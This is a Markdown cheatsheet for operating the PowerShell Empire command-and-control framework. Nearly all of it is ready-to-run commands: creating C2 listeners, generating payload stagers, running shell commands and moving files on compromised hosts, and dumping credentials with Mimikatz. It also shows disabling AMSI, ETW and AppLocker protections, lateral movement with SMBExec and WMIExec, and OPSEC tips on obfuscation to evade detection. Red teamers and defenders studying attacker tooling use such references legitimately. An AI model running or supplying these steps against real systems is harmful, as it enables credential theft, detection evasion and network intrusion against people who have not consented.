# PowerShell Empire Cheatsheet

## Quick Reference

### Starting Empire

```bash
# Start server
cd Empire && ./ps-empire server

# Start client (in another terminal)
cd Empire && ./ps-empire client

# Default credentials:
# Username: empireadmin
# Password: password123
```

### Listener Management

```bash
# List listeners
(Empire) > listeners

# Create HTTP listener
(Empire) > listeners
(Empire: listeners) > uselistener http
(Empire: listeners/http) > set Host http://192.168.1.100:8080
(Empire: listeners/http) > set Port 8080
(Empire: listeners/http) > execute

# Create HTTPS listener
(Empire) > listeners
(Empire: listeners) > uselistener https
(Empire: listeners/https) > set Host https://192.168.1.100:443
(Empire: listeners/https) > set CertPath /path/to/cert.pem
(Empire: listeners/https) > execute
```

### Stager Generation

```bash
# Multi/launcher (PowerShell)
(Empire) > usestager multi/launcher
(Empire: stager/multi/launcher) > set Listener http
(Empire: stager/multi/launcher) > generate

# Windows DLL
(Empire) > usestager windows/dll
(Empire: stager/windows/dll) > set Listener http
(Empire: stager/windows/dll) > generate

# Windows EXE
(Empire) > usestager windows/exe
(Empire: stager/windows/exe) > set Listener http
(Empire: stager/windows/exe) > generate

# Windows PowerShell
(Empire) > usestager windows/launcher_bat
(Empire: stager/windows/launcher_bat) > set Listener http
(Empire: stager/windows/launcher_bat) > generate
```

### Agent Management

```bash
# List agents
(Empire) > agents

# Interact with agent
(Empire) > interact <agent_name>

# Kill agent
(Empire) > kill <agent_name>

# Remove agent
(Empire) > remove <agent_name>

# Agent info
(Empire) > agent_information <agent_name>
```

### Shell Commands

```bash
# Execute shell command
(Empire: <agent>) > shell whoami
(Empire: <agent>) > shell hostname
(Empire: <agent>) > shell ipconfig /all

# Download file
(Empire: <agent>) > download C:\Users\target\file.txt

# Upload file
(Empire: <agent>) > upload /path/to/file.exe C:\temp\file.exe

# Kill process
(Empire: <agent>) > kill <pid>
```

### Post-Exploitation Modules

```bash
# Mimikatz
(Empire) > usemodule powershell/credentials/mimikatz/logonpasswords
(Empire: module/powershell/credentials/mimikatz/logonpasswords) > set Agent <agent_name>
(Empire: module/powershell/credentials/mimikatz/logonpasswords) > execute

# Seatbelt
(Empire) > usemodule powershell/situational_awareness/host/seatbelt
(Empire: module/powershell/situational_awareness/host/seatbelt) > set Agent <agent_name>
(Empire: module/powershell/situational_awareness/host/seatbelt) > execute

# Port scan
(Empire) > usemodule powershell/situational_awareness/network/portscan
(Empire: module/powershell/situational_awareness/network/portscan) > set RHOSTS 10.0.0.0/24
(Empire: module/powershell/situational_awareness/network/portscan) > set Agent <agent_name>
(Empire: module/powershell/situational_awareness/network/portscan) > execute
```

### Bypass Modules

```bash
# AMSI bypass
(Empire) > usemodule powershell/management/bypass_amsi
(Empire: module/powershell/management/bypass_amsi) > set Agent <agent_name>
(Empire: module/powershell/management/bypass_amsi) > execute

# ETW bypass
(Empire) > usemodule powershell/management/bypass_etw
(Empire: module/powershell/management/bypass_etw) > set Agent <agent_name>
(Empire: module/powershell/management/bypass_etw) > execute

# AppLocker bypass
(Empire) > usemodule powershell/management/bypass_applocker
(Empire: module/powershell/management/bypass_applocker) > set Agent <agent_name>
(Empire: module/powershell/management/bypass_applocker) > execute
```

### Lateral Movement

```bash
# SMBExec
(Empire) > usemodule powershell/lateral_movement/invoke_smbexec
(Empire: module/powershell/lateral_movement/invoke_smbexec) > set RHOSTS 10.0.0.51
(Empire: module/powershell/lateral_movement/invoke_smbexec) > set Username admin
(Empire: module/powershell/lateral_movement/invoke_smbexec) > set Password password123
(Empire: module/powershell/lateral_movement/invoke_smbexec) > set Agent <agent_name>
(Empire: module/powershell/lateral_movement/invoke_smbexec) > execute

# WMIExec
(Empire) > usemodule powershell/lateral_movement/invoke_wmiexec
(Empire: module/powershell/lateral_movement/invoke_wmiexec) > set RHOSTS 10.0.0.51
(Empire: module/powershell/lateral_movement/invoke_wmiexec) > set Username admin
(Empire: module/powershell/lateral_movement/invoke_wmiexec) > set Password password123
(Empire: module/powershell/lateral_movement/invoke_wmiexec) > set Agent <agent_name>
(Empire: module/powershell/lateral_movement/invoke_wmiexec) > execute
```

### REST API

```bash
# Authenticate
curl -X POST http://127.0.0.1:1337/api/auth -d '{"username":"empireadmin","password":"password123"}'

# List agents
curl -H "Authorization: Bearer <token>" http://127.0.0.1:1337/api/agents

# Execute module
curl -X POST -H "Authorization: Bearer <token>" http://127.0.0.1:1337/api/agents/<agent>/execute -d '{"module":"powershell/credentials/mimikatz/logonpasswords"}'

# List listeners
curl -H "Authorization: Bearer <token>" http://127.0.0.1:1337/api/listeners
```

### Starkiller

```bash
# Access Starkiller web GUI
# URL: http://localhost:1337
# Username: empireadmin
# Password: password123

# Features:
# - Visual dashboard
# - Agent management
# - Module execution
# - Graph view
# - Process browser
```

### Custom Agents

```bash
# Generate C# agent
(Empire) > usestager windows/csharp_exe
(Empire: stager/windows/csharp_exe) > set Listener http
(Empire: stager/windows/csharp_exe) > generate

# Generate Python agent
(Empire) > usestager python/launcher
(Empire: stager/python/launcher) > set Listener http
(Empire: stager/python/launcher) > generate
```

### OPSEC Tips

```bash
# Use encrypted listeners (HTTPS)
(Empire) > uselistener https

# Enable obfuscation
(Empire) > set obfuscation True

# Use malleable profiles
(Empire) > set MalleableProfile http_malleable.profile

# AMSI bypass
(Empire) > usemodule powershell/management/bypass_amsi
(Empire: module/powershell/management/bypass_amsi) > set Agent <agent_name>
(Empire: module/powershell/management/bypass_amsi) > execute
```

### Troubleshooting

```bash
# Server won't start
python3 --version
cd Empire && ./ps-empire install -y
netstat -tlnp | grep 1337

# Agent doesn't connect
# Check: listener running, firewall rules, stager execution

# Modules fail
# Check: agent active, dependencies, error messages

# AMSI detection
# Use: bypass module, obfuscation, C#/Python agents
```
